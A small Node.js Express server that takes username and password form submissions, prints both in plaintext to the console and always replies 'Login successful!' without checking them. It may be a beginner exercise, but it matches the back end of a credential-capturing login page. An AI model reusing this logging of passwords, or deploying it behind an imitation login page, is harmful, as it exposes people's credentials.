const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = 3000;

// Middleware to parse JSON bodies and form data
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Handle form submission
app.post('/send-data', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    console.error('Missing username or password');
    return res.redirect('/error.html'); // ✅ Show your error page
  }

  // ✅ Print to terminal
  console.log('--- New Form Submission ---');
  console.log('Username:', username);
  console.log('Password:', password);
  console.log('---------------------------');

  // ✅ Redirect back or show message
  res.send('Login successful!'); // You can replace this with a redirect or custom page
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
